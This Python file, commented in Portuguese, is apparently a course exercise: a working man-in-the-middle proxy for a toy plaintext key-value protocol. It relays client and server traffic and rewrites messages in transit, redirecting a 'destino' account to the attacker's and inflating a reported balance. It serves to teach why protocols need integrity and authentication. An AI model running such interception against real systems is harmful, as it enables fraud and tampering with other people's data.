#!/usr/bin/env python3
"""
Proxy MITM (Man-in-the-Middle) do protocolo KVP - Fase 2.

Posiciona-se ENTRE o cliente e o servidor. O cliente e configurado para
apontar para o proxy (redirecionamento por configuracao); o proxy abre a
conexao real ao servidor e faz o relay das mensagens nos dois sentidos.

Demonstra a quebra de INTEGRIDADE e AUTENTICACAO: como o protocolo KVP nao
tem cifragem nem assinatura, o proxy consegue LER e ALTERAR mensagens em
transito, e as duas pontas aceitam o conteudo adulterado como legitimo.

Caracteristicas (requisitos da Fase 2):
  - Relay bidirecional cliente <-> servidor (sockets diretos).
  - Leitura e modificacao controlada das mensagens (regras configuraveis).
  - Concorrencia: uma sessao por conexao, atendidas simultaneamente.
  - Robustez: desconexoes e linhas malformadas afetam so a propria sessao.

Modelo de concorrencia e regioes criticas: ver docs/CONCORRENCIA.md.

Uso:
    python3 proxy_mitm.py --listen 0.0.0.0:5050 --server <ip-servidor>:5050
    python3 proxy_mitm.py --listen 0.0.0.0:5050 --server 10.10.0.10:5050 --transparente
"""
import argparse
import socket
import threading

# O proxy e autossuficiente (nao depende do codigo do servico). Precisa so
# saber o framing do KVP: UTF-8, uma mensagem por linha terminada em '\n'.
ENCODING = "utf-8"
PORTA_PADRAO = 5050

# ---------------------------------------------------------------------------
# Estado compartilhado entre as threads (regioes criticas protegidas por lock).
#   _sid        : contador de sessoes, da um numero unico a cada conexao.
#   _stats      : totais globais (sessoes, linhas, linhas modificadas).
#   LOG_LOCK    : serializa o stdout para o log de varias threads sair legivel.
# ---------------------------------------------------------------------------
_sid = 0
_sid_lock = threading.Lock()
_stats = {"sessoes": 0, "linhas": 0, "modificadas": 0}
_stats_lock = threading.Lock()
LOG_LOCK = threading.Lock()


def log(sid, mensagem: str) -> None:
    """Escreve uma linha de log de forma atomica."""
    with LOG_LOCK:
        print(f"[sessao {sid}] {mensagem}", flush=True)


def proximo_sid() -> int:
    """Gera o proximo id de sessao (regiao critica: contador compartilhado)."""
    global _sid
    with _sid_lock:
        _sid += 1
        return _sid


def contar(chave: str, n: int = 1) -> None:
    """Soma nas estatisticas globais (regiao critica)."""
    with _stats_lock:
        _stats[chave] += n


# ---------------------------------------------------------------------------
# Motor de modificacao. Cada regra olha UMA linha (ja sem o '\n') em um
# sentido e devolve a linha alterada, ou None se nao se aplica. As regras sao
# somente leitura e compartilhadas, entao nao precisam de lock.
#
# Sentidos: "C->S" (cliente para servidor) e "S->C" (servidor para cliente).
# ---------------------------------------------------------------------------
def regra_redireciona_destino(texto: str, sentido: str):
    """C->S: troca o valor de 'SET destino ...' por uma conta do atacante.

    O cliente pensa que gravou o proprio destino; o servidor grava o do
    atacante. Nenhuma das pontas detecta a troca (sem integridade)."""
    if sentido != "C->S":
        return None
    partes = texto.split(" ")
    if len(partes) >= 3 and partes[0].upper() == "SET" and partes[1] == "destino":
        return "SET destino conta-do-atacante"
    return None


def regra_infla_saldo(texto: str, sentido: str):
    """S->C: infla a resposta 'VALUE saldo ...' que o servidor manda ao cliente.

    O cliente pergunta o saldo e recebe um numero falso como se fosse real."""
    if sentido != "S->C":
        return None
    partes = texto.split(" ")
    if len(partes) >= 3 and partes[0].upper() == "VALUE" and partes[1] == "saldo":
        return "VALUE saldo 999999"
    return None


REGRAS = [regra_redireciona_destino, regra_infla_saldo]


def aplicar_regras(texto: str, sentido: str):
    """Aplica as regras na ordem. Retorna (texto_final, descricao|None)."""
    for regra in REGRAS:
        try:
            novo = regra(texto, sentido)
        except Exception:
            novo = None  # uma regra ruim nunca derruba o relay
        if novo is not None and novo != texto:
            return novo, regra.__name__
    return texto, None


# ---------------------------------------------------------------------------
# Relay de um sentido. Le linha a linha (framing do KVP e por '\n'), aplica as
# regras e repassa. Preserva bytes de linhas malformadas (sem decodificar).
# ---------------------------------------------------------------------------
def relay(sid, origem: socket.socket, destino: socket.socket, sentido: str,
          modificar: bool) -> None:
    arquivo = origem.makefile("rb", buffering=0)
    try:
        for linha_bruta in arquivo:
            contar("linhas")
            saida = linha_bruta  # por padrao repassa identico

            # So tenta modificar linhas de texto bem formadas (terminadas em \n).
            if modificar and linha_bruta.endswith(b"\n"):
                try:
                    texto = linha_bruta.decode(ENCODING).rstrip("\n")
                except UnicodeDecodeError:
                    texto = None  # linha binaria/malformada: repassa intacta
                if texto is not None:
                    novo, qual = aplicar_regras(texto, sentido)
                    if qual is not None:
                        saida = (novo + "\n").encode(ENCODING)
                        contar("modificadas")
                        log(sid, f"{sentido} ORIGINAL : {texto}")
                        log(sid, f"{sentido} ALTERADA : {novo}   (regra: {qual})")
                    else:
                        log(sid, f"{sentido} repassa  : {texto}")

            destino.sendall(saida)
    except (ConnectionError, OSError):
        pass  # a ponta caiu; encerramos este sentido sem afetar outras sessoes
    finally:
        # Fecha os dois lados para destravar a outra direcao desta sessao.
        _fechar(origem)
        _fechar(destino)


def _fechar(sock: socket.socket) -> None:
    try:
        sock.shutdown(socket.SHUT_RDWR)
    except OSError:
        pass
    try:
        sock.close()
    except OSError:
        pass


def tratar_sessao(cli_sock: socket.socket, cli_addr, server_addr, modificar: bool) -> None:
    """Atende uma sessao: conecta no servidor e sobe os dois relays."""
    sid = proximo_sid()
    contar("sessoes")
    log(sid, f"nova conexao de {cli_addr[0]}:{cli_addr[1]}")
    try:
        srv_sock = socket.create_connection(server_addr, timeout=10)
    except OSError as erro:
        log(sid, f"nao foi possivel conectar no servidor {server_addr}: {erro}")
        _fechar(cli_sock)
        return
    log(sid, f"conectado ao servidor real {server_addr[0]}:{server_addr[1]}")

    # Uma thread por sentido. Cada sessao tem o seu par de threads isolado.
    t_cs = threading.Thread(
        target=relay, args=(sid, cli_sock, srv_sock, "C->S", modificar), daemon=True)
    t_sc = threading.Thread(
        target=relay, args=(sid, srv_sock, cli_sock, "S->C", modificar), daemon=True)
    t_cs.start()
    t_sc.start()
    t_cs.join()
    t_sc.join()
    log(sid, "sessao encerrada")


def parse_hostport(valor: str, porta_padrao: int):
    """Converte 'host:porta' (porta opcional) em (host, porta)."""
    if ":" in valor:
        host, porta = valor.rsplit(":", 1)
        return host, int(porta)
    return valor, porta_padrao


def main() -> None:
    parser = argparse.ArgumentParser(description="Proxy MITM concorrente do KVP - Fase 2")
    parser.add_argument("--listen", default="0.0.0.0:5050",
                        help="onde o proxy escuta o cliente (host:porta)")
    parser.add_argument("--server", required=True,
                        help="servidor real para onde o proxy encaminha (host:porta)")
    parser.add_argument("--transparente", action="store_true",
                        help="desliga as modificacoes (relay puro, so leitura)")
    args = parser.parse_args()

    listen_host, listen_port = parse_hostport(args.listen, PORTA_PADRAO)
    server_addr = parse_hostport(args.server, PORTA_PADRAO)
    modificar = not args.transparente

    escuta = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    escuta.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    escuta.bind((listen_host, listen_port))
    escuta.listen(16)
    modo = "COM modificacao" if modificar else "transparente (so leitura)"
    log("-", f"proxy MITM escutando em {listen_host}:{listen_port}, "
             f"encaminhando para {server_addr[0]}:{server_addr[1]} [{modo}]")
    log("-", "Ctrl+C para encerrar.")

    try:
        while True:
            cli_sock, cli_addr = escuta.accept()
            # Uma thread por sessao: varias conexoes simultaneas.
            threading.Thread(
                target=tratar_sessao,
                args=(cli_sock, cli_addr, server_addr, modificar),
                daemon=True,
            ).start()
    except KeyboardInterrupt:
        with _stats_lock:
            resumo = dict(_stats)
        log("-", f"encerrando. Totais: {resumo}")
    finally:
        escuta.close()


if __name__ == "__main__":
    main()
